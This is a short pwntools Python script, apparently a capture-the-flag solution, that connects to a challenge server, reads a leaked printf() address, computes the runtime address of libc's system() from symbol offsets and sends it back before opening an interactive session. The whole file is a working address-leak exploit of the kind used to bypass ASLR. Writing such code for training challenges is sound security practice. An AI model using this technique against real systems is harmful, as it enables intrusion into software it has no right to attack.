from pwn import *

libc = ELF('./libc.so.6')

HOST = 'cyberchallenge.disi.unitn.it'
PORT = 9100

p = remote(HOST, PORT)

system = libc.symbols['system']

printf = libc.symbols['printf']

p.recvuntil('In my libc, printf() is at ')
leaked_printf = int (p.recvuntil(', can you guess').strip().split(b',')[0],16)


offset = system - printf

system_runtime = leaked_printf + offset

p.sendline(str(system_runtime))

p.interactive()
